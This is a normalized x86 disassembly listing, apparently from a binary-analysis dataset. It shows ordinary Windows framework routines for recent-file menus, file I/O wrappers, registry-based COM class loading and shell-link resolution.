pop edi
pop esi
pop ebx
retn
sub_4436e1
mov eax sub_463fa2
call sub_42dc88
push esi
call sub_4535a1
mov esi eax
cmp [ esi + 0x18 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x18 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_447ab1
call sub_441e77
push 0x48
mov ebx eax
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push r--data
call sub_4434bc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x18 ] eax
call sub_441e77
pop ebx
sub_443786
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_4436e1
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_43d5d6
sub_4437c6
push ebp
mov ebp esp
sub esp 0x104
push esi
mov esi 0x100
push edi
lea eax [ ebp - 0x104 ]
push esi
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
call sub_44384a
mov edi eax
mov eax esi
sub eax edi
cmp eax 0x2
jbe r-xdata
push ebx
mov edi esi
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_4422d1
xor eax eax
test edi edi
setg al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add edi esi
push edi
lea eax [ edi - 0x1 ]
push eax
call sub_442578
push eax
push [ ebp + 0x8 ]
call sub_44384a
mov ebx eax
mov eax edi
sub eax ebx
cmp eax 0x2
jle r-xdata
mov ecx [ ebp - 0x4 ]
push 0xffffffff
call sub_4425c7
xor eax eax
test ebx ebx
setg al
pop ebx
pop edi
pop esi
leave
retn 0x4
sub_44384a
push esi
call sub_45357b
push [ esp + 0x10 ]
mov esi [ esp + 0x10 ]
mov eax [ eax + 0xc ]
push esi
push [ esp + 0x10 ]
push eax
call [ LoadStringA@IAT ]
test eax eax
jne r-xdata
pop esi
retn 0xc
and [ esi ] al
sub_443871
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
movsx eax [ ebp + 0x14 ]
push eax
push esi
call sub_42e6a3
pop ecx
test eax eax
pop ecx
jne r-xdata
movsx edi [ ebp + 0x14 ]
sub eax esi
push esi
call [ lstrlenA@IAT ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_4420d3
inc esi
mov eax ebx
dec ebx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push eax
push esi
push eax
call sub_4425ef
push eax
call sub_42e2d0
add esp 0xc
push 0x1
pop eax
push edi
push esi
call sub_42e6a3
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
sub_4438e9
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call [ lstrlenA@IAT ]
push 0x0
push 0x0
push edi
mov ebx eax
call sub_4562a4
dec eax
mov esi ebx
sub esi eax
cmp [ ebp + 0xc ] ebx
mov [ ebp + 0x8 ] eax
lea ecx [ esi + edi ]
mov [ ebp - 0x4 ] ecx
jge r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
cmp [ ebp + 0xc ] eax
jge r-xdata
cmp [ edi ] 0x5c
lea ebx [ edi + 0x2 ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp esi 0x3
jle r-xdata
cmp [ edi + 0x1 ] 0x5c
jne r-xdata
push ecx
jmp r-xdata
mov ecx rw-data
mov eax [ ebp + 0x8 ]
mov esi ebx
sub esi edi
lea eax [ esi + eax + 0x5 ]
cmp [ ebp + 0xc ] eax
jge r-xdata
push ebx
call sub_42e14b
mov ebx eax
pop ecx
cmp [ ebx ] 0x5c
jne r-xdata
cmp [ ebx ] 0x5c
je r-xdata
push edi
call [ lstrcpyA@IAT ]
jmp r-xdata
push ebx
call [ lstrlenA@IAT ]
lea eax [ eax + esi + 0x4 ]
cmp eax [ ebp + 0xc ]
jle r-xdata
push [ ebp - 0x4 ]
push ebx
call sub_42e14b
pop ecx
mov ebx eax
jmp r-xdata
and [ esi + edi ] 0x0
mov esi [ lstrcatA@IAT ]
push r--data
push edi
call esi
push ebx
push edi
call esi
push ebx
call sub_42e14b
mov ebx eax
pop ecx
cmp [ ebx ] 0x5c
jne r-xdata
jmp r-xdata
sub_4439ba
mov eax sub_4641ff
call sub_42dc88
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
lea ebx [ esi + 0xc ]
mov [ ebx ] eax
mov eax [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x10 ] eax
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_441e89
pop ecx
mov [ ebp - 0x14 ] eax
test eax eax
mov [ ebp - 0x4 ] 0x3
je r-xdata
xor eax eax
push sub_442148
mov [ eax ] edi
push sub_42699c
add eax 0x4
push edi
push 0x4
push eax
mov [ ebp + 0x14 ] eax
call sub_42e240
mov eax [ ebp + 0x14 ]
jmp r-xdata
push [ ebp + 0xc ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x4 ] edi
mov [ esi + 0x14 ] eax
call sub_4422d1
push [ ebp + 0x10 ]
lea ecx [ esi + 0x10 ]
call sub_4422d1
mov eax [ ebp + 0x18 ]
mov ecx [ ebp - 0xc ]
mov [ esi + 0x18 ] eax
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x14
sub_443a8e
push ebx
mov bl [ esp + 0x8 ]
push esi
mov esi ecx
test bl 0x2
je r-xdata
mov ecx esi
call sub_442148
test bl 0x1
je r-xdata
push edi
lea edi [ esi - 0x4 ]
push sub_442148
push [ edi ]
push 0x4
push esi
call sub_42e162
test bl 0x1
je r-xdata
mov eax esi
push esi
call sub_441eb2
pop ecx
mov eax edi
pop edi
jmp r-xdata
push edi
call sub_441eb2
pop ecx
pop esi
pop ebx
retn 0x4
sub_443ad9
mov eax sub_46422d
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x4 ] 0x2
test ecx ecx
je r-xdata
lea ecx [ esi + 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x10 ]
call sub_442148
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ esi + 0xc ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push 0x3
call sub_443a8e
sub_443b36
push ebp
mov ebp esp
sub esp 0x104
push esi
push edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
mov esi ecx
push eax
call sub_4447b8
mov eax [ esi + 0x4 ]
xor edi edi
dec eax
test eax eax
jle r-xdata
mov ecx [ esi + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_4422d1
pop edi
pop esi
leave
retn 0x4
mov eax [ esi + 0x8 ]
lea ecx [ ebp - 0x104 ]
push ecx
mov eax [ eax + edi * 4 ]
push eax
call sub_44494e
test eax eax
jne r-xdata
test edi edi
jle r-xdata
mov eax [ esi + 0x4 ]
inc edi
dec eax
cmp edi eax
jl r-xdata
mov eax [ esi + 0x8 ]
lea ecx [ eax + edi * 4 ]
lea eax [ ecx - 0x4 ]
push eax
call sub_442281
dec edi
jmp r-xdata
sub_443ba7
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
mov eax [ esi + 0x8 ]
lea ecx [ eax + edi * 4 ]
call sub_4420d3
lea ecx [ eax + edi * 4 ]
call sub_4420d3
pop edi
pop esi
retn 0x4
lea ecx [ eax + edi * 4 + 0x4 ]
push ecx
lea ecx [ eax + edi * 4 ]
call sub_442281
inc edi
jmp r-xdata
mov eax [ esi + 0x4 ]
dec eax
cmp edi eax
mov eax [ esi + 0x8 ]
jge r-xdata
sub_443be2
push ebp
mov ebp esp
sub esp 0x108
mov eax [ ebp + 0xc ]
push esi
mov esi eax
mov eax [ ecx + 0x8 ]
shl esi 0x2
mov [ ebp - 0x4 ] ecx
mov eax [ eax + esi ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx 0x104
push edi
push ebx
call sub_442578
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
push [ eax + esi ]
push edi
call [ lstrcpyA@IAT ]
push 0x0
push 0x0
push edi
call sub_4562a4
push 0x1
pop esi
push edi
sub esi eax
call [ lstrlenA@IAT ]
add esi eax
mov eax [ ebp + 0x14 ]
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0xffffffff
je r-xdata
mov cl [ esi + edi ]
and [ eax + edi ] 0x0
push edi
add eax edi
push [ ebp + 0x10 ]
mov [ ebp + 0xf ] cl
mov [ ebp + 0x14 ] eax
call [ lstrcmpiA@IAT ]
neg eax
sbb eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov al [ ebp + 0xf ]
mov [ esi + edi ] al
je r-xdata
pop esi
leave
retn 0x14
mov ecx [ ebp + 0x8 ]
push 0xffffffff
call sub_4425c7
push 0x1
pop eax
pop edi
pop ebx
lea ecx [ ebp - 0x108 ]
lea eax [ esi + edi ]
push ebx
push ecx
push eax
mov [ ebp + 0xc ] eax
call sub_444a11
sub ebx esi
lea eax [ ebp - 0x108 ]
push ebx
push eax
push [ ebp + 0xc ]
call [ lstrcpynA@IAT ]
push [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
push [ eax + 0x18 ]
push edi
call sub_4438e9
lea eax [ ebp - 0x108 ]
push ebx
push eax
push [ ebp + 0x14 ]
call sub_444a11
lea eax [ ebp - 0x108 ]
push ebx
push eax
push edi
call [ lstrcpynA@IAT ]
jmp r-xdata
sub_443ce8
mov eax sub_464250
call sub_42dc88
sub esp 0x124
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov edi ecx
mov ecx [ esi + 0xc ]
mov eax [ edi + 0x1c ]
lea ebx [ edi + 0x1c ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ eax ]
xor eax eax
cmp [ ecx - 0x8 ] eax
jne r-xdata
test ecx ecx
je r-xdata
cmp [ esi + 0xc ] eax
je r-xdata
mov ebx [ ebx ]
cmp [ ebx - 0x8 ] eax
je r-xdata
push 0x0
push ebx
push [ esi + 0x4 ]
call sub_4269a7
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
xor ebx ebx
cmp [ edi + 0x4 ] eax
jle r-xdata
mov eax [ esi ]
push 0x0
mov ecx esi
call [ eax ]
jmp r-xdata
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0xc ]
lea eax [ ebp - 0x130 ]
push eax
push 0x104
call [ GetCurrentDirectoryA@IAT ]
lea eax [ ebp - 0x130 ]
push eax
call [ lstrlenA@IAT ]
mov ecx [ rw-data ]
mov [ ebp + eax - 0x130 ] 0x5c
and [ ebp + eax - 0x12f ] 0x0
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] ecx
xor ebx ebx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
cmp [ edi + 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
jle r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0xc ]
add eax ebx
push 0x0
push eax
push [ ecx + 0x4 ]
call [ DeleteMenu@IAT ]
inc ebx
cmp ebx [ edi + 0x4 ]
jl r-xdata
mov eax [ esi + 0xc ]
dec [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ GetMenuItemCount@IAT ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x18 ] 0x1
call sub_442148
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_442148
jmp r-xdata
push 0x1
push eax
lea eax [ ebp - 0x130 ]
mov ecx edi
push eax
lea eax [ ebp - 0x14 ]
push ebx
push eax
call sub_443be2
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ eax - 0x8 ]
add eax eax
push eax
call sub_442578
mov ecx [ ebp + 0x8 ]
and [ eax ] 0x0
push 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_4425c7
mov eax [ edi + 0x14 ]
push 0xa
xor edx edx
pop ecx
lea eax [ eax + ebx + 0x1 ]
div ecx
lea eax [ ebp - 0x2c ]
push edx
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x2c ]
lea ecx [ ebp - 0x1c ]
push eax
call sub_4421b6
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x2
push ecx
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_442377
mov eax [ eax ]
mov ecx [ esi + 0x8 ]
mov [ ebp + 0x8 ] eax
mov eax [ esi + 0x4 ]
push [ ebp + 0x8 ]
lea edx [ ecx + 0x1 ]
mov [ esi + 0x8 ] edx
lea edx [ eax + 0x1 ]
push eax
mov eax [ esi + 0xc ]
push 0x400
push ecx
mov [ esi + 0x4 ] edx
push [ eax + 0x4 ]
call [ InsertMenuA@IAT ]
lea ecx [ ebp - 0x18 ]
call sub_442148
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
inc ebx
cmp ebx [ edi + 0x4 ]
jl r-xdata
cmp dl 0x26
jne r-xdata
mov eax [ ebp - 0x20 ]
mov dl [ ecx ]
mov [ ebp + 0xb ] dl
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
mov [ eax ] dl
inc eax
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
jmp r-xdata
mov dl [ ebp + 0xb ]
mov [ eax ] dl
inc eax
inc ecx
mov dl [ ecx ]
test dl dl
je r-xdata
sub_443f02
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x10 ]
mov eax [ eax - 0x8 ]
add eax 0x5
push eax
call sub_441e89
pop ecx
mov [ ebp - 0x4 ] eax
call sub_45357b
mov eax [ eax + 0x4 ]
xor edi edi
push edi
push edi
push [ esi + 0xc ]
mov ecx eax
mov [ ebp - 0x8 ] eax
call sub_44ad74
cmp [ esi + 0x4 ] edi
jle r-xdata
push [ ebp - 0x4 ]
call sub_441eb2
pop ecx
pop edi
pop esi
leave
retn
push ebx
mov edi ebx
cmp edi [ esi + 0x4 ]
jl r-xdata
mov ecx [ ebp - 0x8 ]
push edi
push [ ebp - 0x4 ]
push [ esi + 0xc ]
call sub_44ad74
lea ebx [ edi + 0x1 ]
push ebx
push [ esi + 0x10 ]
push [ ebp - 0x4 ]
call [ wsprintfA@IAT ]
mov eax [ esi + 0x8 ]
add esp 0xc
mov edi [ eax + edi * 4 ]
cmp [ edi - 0x8 ] 0x0
je r-xdata
pop ebx
sub_443f80
mov eax sub_464264
call sub_42dc88
sub esp 0xc
push esi
mov esi ecx
push edi
mov eax [ esi + 0x10 ]
mov eax [ eax - 0x8 ]
add eax 0x5
push eax
call sub_441e89
pop ecx
mov [ ebp - 0x10 ] eax
call sub_45357b
mov eax [ eax + 0x4 ]
xor edi edi
cmp [ esi + 0x4 ] edi
mov [ ebp - 0x14 ] eax
jle r-xdata
push [ ebp - 0x10 ]
call sub_441eb2
pop ecx
pop edi
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push ebx
mov eax [ esi + 0x10 ]
lea ebx [ edi + 0x1 ]
push ebx
push eax
push [ ebp - 0x10 ]
call [ wsprintfA@IAT ]
mov eax [ esi + 0xc ]
add esp 0xc
mov ecx [ ebp - 0x14 ]
push rw-data
push [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_454898
and [ ebp - 0x4 ] 0x0
push eax
mov eax [ esi + 0x8 ]
lea ecx [ eax + edi * 4 ]
call sub_442281
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x18 ]
call sub_442148
mov edi ebx
cmp edi [ esi + 0x4 ]
jl r-xdata
pop ebx
sub_444073
mov eax sub_4648cb
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
cmp [ esi + 0x4 ] 0xffffffff
mov [ ebp - 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xc ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ esi + 0x8 ] 0x0
je r-xdata
call sub_44434b
sub_4440bb
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov ebx ecx
push 0x10
call sub_441e89
test eax eax
pop ecx
je r-xdata
xor edi edi
push 0xffffffff
mov ecx eax
call sub_444054
mov edi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
pop edi
pop ebx
leave
retn
test edi edi
je r-xdata
push esi
mov esi [ GetCurrentProcess@IAT ]
push 0x2
push 0x0
lea eax [ ebp - 0x4 ]
push 0x0
push eax
call esi
push eax
push [ ebx + 0x4 ]
call esi
push eax
call [ DuplicateHandle@IAT ]
test eax eax
pop esi
jne r-xdata
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_444ac1
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax + 0x4 ]
sub_444130
push ebp
mov ebp esp
sub esp 0x110
push ebx
push esi
mov esi ecx
push edi
mov edi [ ebp + 0xc ]
and [ esi + 0x8 ] 0x0
or [ esi + 0x4 ] 0xffffffff
lea ebx [ esi + 0xc ]
and edi 0xffff7fff
mov ecx ebx
call sub_4420d3
push [ ebp + 0x8 ]
lea eax [ ebp - 0x110 ]
push eax
call sub_4447b8
lea eax [ ebp - 0x110 ]
mov ecx ebx
push eax
call sub_4422d1
mov eax edi
xor ecx ecx
and eax 0x3
sub eax ecx
je r-xdata
mov ecx 0x80000000
dec eax
je r-xdata
xor eax eax
cmp eax 0x10
je r-xdata
mov ecx 0x40000000
jmp r-xdata
dec eax
jne r-xdata
push 0x3
pop edi
and edi 0x2000
neg edi
sbb edi edi
and edi 0x2
inc edi
inc edi
jmp r-xdata
cmp eax 0x20
je r-xdata
mov eax edi
push 0x1
and eax 0x70
pop ebx
je r-xdata
mov ecx 0xc0000000
jmp r-xdata
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
mov eax ebx
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
push 0x0
push 0x80
lea edx [ ebp - 0xc ]
push edi
push edx
push eax
push ecx
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov eax ebx
jmp r-xdata
cmp eax 0x30
je r-xdata
xor eax eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
mov [ esi + 0xc ] eax
call sub_444bed
push [ ebp + 0x8 ]
lea ecx [ esi + 0x10 ]
mov [ esi + 0x8 ] eax
call sub_4422d1
and [ ebp - 0x8 ] 0x0
mov edx edi
not edx
shr edx 0x7
and edx ebx
mov [ ebp - 0xc ] 0xc
test edi 0x1000
mov [ ebp - 0x4 ] edx
je r-xdata
push 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
pop eax
jmp r-xdata
push 0x3
sub_44424d
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
jne r-xdata
lea eax [ ebp + 0xc ]
push 0x0
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
call [ GetLastError@IAT ]
push eax
call sub_444ac1
pop ebp
retn 0x8
sub_444287
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
lea eax [ ebp + 0xc ]
push 0x0
push eax
push edi
push [ ebp + 0x8 ]
push [ esi + 0x4 ]
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
push [ esi + 0xc ]
call [ GetLastError@IAT ]
push eax
call sub_444ac1
push [ esi + 0xc ]
push 0xffffffff
push 0xd
call sub_444b82
sub_4442d2
push esi
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ SetFilePointer@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax esi
pop esi
retn 0x8
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_444ac1
sub_444301
push esi
push 0x1
push 0x0
push 0x0
push [ ecx + 0x4 ]
call [ SetFilePointer@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax esi
pop esi
retn
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_444ac1
sub_44434b
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
or [ esi + 0x4 ] 0xffffffff
and [ esi + 0x8 ] 0x0
lea ecx [ esi + 0xc ]
call sub_4420d3
test edi edi
pop edi
pop esi
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov edi eax
neg edi
sbb edi edi
inc edi
retn
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_444ac1
sub_4443ac
push 0x0
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ LockFile@IAT ]
test eax eax
jne r-xdata
retn 0x8
push eax
call [ GetLastError@IAT ]
push eax
call sub_444ac1
sub_4443d5
push 0x0
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ UnlockFile@IAT ]
test eax eax
jne r-xdata
retn 0x8
push eax
call [ GetLastError@IAT ]
push eax
call sub_444ac1
sub_4443fe
push esi
mov esi ecx
push 0x0
mov eax [ esi ]
push [ esp + 0xc ]
call [ eax + 0x28 ]
push [ esi + 0x4 ]
call [ SetEndOfFile@IAT ]
test eax eax
pop esi
jne r-xdata
retn 0x4
push eax
call [ GetLastError@IAT ]
push eax
call sub_444ac1
sub_44442a
push ebx
push esi
mov esi ecx
push edi
push 0x1
push 0x0
mov eax [ esi ]
call [ eax + 0x28 ]
mov edi eax
mov eax [ esi ]
push 0x2
push 0x0
mov ecx esi
call [ eax + 0x28 ]
mov ebx eax
mov eax [ esi ]
push 0x0
push edi
mov ecx esi
call [ eax + 0x28 ]
pop edi
mov eax ebx
pop esi
pop ebx
retn
sub_44449c
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push r--data
push [ ebp + 0x8 ]
call sub_4444de
test eax eax
jl r-xdata
leave
retn 0x10
mov eax [ ebp - 0x4 ]
push esi
push [ ebp + 0x14 ]
mov ecx [ eax ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ecx + 0xc ]
mov esi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
pop esi
sub_4444de
mov eax sub_4648e8
call sub_42dc88
push ecx
push esi
mov esi [ ebp + 0x10 ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
and [ esi ] 0x0
push eax
call sub_44457b
mov eax [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov [ ebp + 0x10 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
push eax
push [ ebp - 0x10 ]
call sub_4445ea
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
call [ LoadLibraryA@IAT ]
test eax eax
je r-xdata
mov esi 0x80040154
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0x10 ]
call sub_442148
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov esi 0x800401f9
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
mov esi eax
jmp r-xdata
sub_44457b
push ebp
mov ebp esp
sub esp 0x104
mov eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
movzx ecx [ eax + 0xf ]
push ecx
movzx ecx [ eax + 0xe ]
push ecx
movzx ecx [ eax + 0xd ]
push ecx
movzx ecx [ eax + 0xc ]
push ecx
movzx ecx [ eax + 0xb ]
push ecx
movzx ecx [ eax + 0xa ]
push ecx
movzx ecx [ eax + 0x9 ]
push ecx
movzx ecx [ eax + 0x8 ]
push ecx
movzx ecx [ eax + 0x6 ]
push ecx
movzx ecx [ eax + 0x4 ]
push ecx
push [ eax ]
lea eax [ ebp - 0x104 ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov ecx [ ebp + 0x8 ]
add esp 0x34
lea eax [ ebp - 0x104 ]
push eax
call sub_4421b6
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_4445ea
push ebp
mov ebp esp
sub esp 0x10
push ebx
lea eax [ ebp - 0x8 ]
push esi
mov esi [ RegOpenKeyA@IAT ]
push eax
xor ebx ebx
push r--data
push 0x80000000
mov [ ebp - 0x8 ] ebx
call esi
test eax eax
jne r-xdata
mov eax ebx
pop esi
pop ebx
leave
retn 0x8
lea eax [ ebp - 0x4 ]
push edi
push eax
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
push [ ebp - 0x8 ]
call esi
mov edi [ RegCloseKey@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
call edi
pop edi
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] ebx
push eax
push r--data
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call edi
mov ecx [ ebp + 0xc ]
mov esi 0x104
push esi
call sub_442578
lea ecx [ ebp - 0xc ]
mov [ ebp - 0xc ] esi
push ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
push rw-data
push [ ebp + 0x8 ]
call [ RegQueryValueExA@IAT ]
mov ecx [ ebp + 0xc ]
push 0xffffffff
mov esi eax
call sub_4425c7
push [ ebp + 0x8 ]
xor eax eax
cmp esi ebx
sete al
mov ebx eax
call edi
sub_444696
push ebp
mov ebp esp
sub esp 0x16c
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ eax ] bl
push 0x800
lea eax [ ebp - 0x16c ]
push 0x160
push eax
push ebx
push [ ebp + 0xc ]
call [ SHGetFileInfoA@IAT ]
test eax eax
je r-xdata
xor eax eax
test [ ebp - 0x162 ] 0x1
je r-xdata
lea eax [ ebp - 0x4 ]
lea ecx [ ebp - 0xc ]
push eax
push r--data
push ebx
push r--data
call sub_44449c
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x8 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
jmp r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
lea esp [ ebp - 0x178 ]
pop edi
pop esi
pop ebx
leave
retn 0x10
push [ ebp + 0xc ]
call [ lstrlenA@IAT ]
mov esi eax
inc esi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_42f0a0
mov edi esp
push esi
push edi
push 0xffffffff
push [ ebp + 0xc ]
mov [ edi ] bx
push ebx
push ebx
call [ MultiByteToWideChar@IAT ]
xor edi edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
push ebx
push edi
push eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
test eax eax
jl r-xdata
mov eax [ eax + 0x1c ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
push ebx
push ebx
push [ ebp + 0x14 ]
mov ecx [ eax ]
push [ ebp + 0x10 ]
push eax
call [ ecx + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
push 0x1
pop ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push 0x2
push eax
push ecx
mov edx [ ecx ]
call [ edx + 0x4c ]
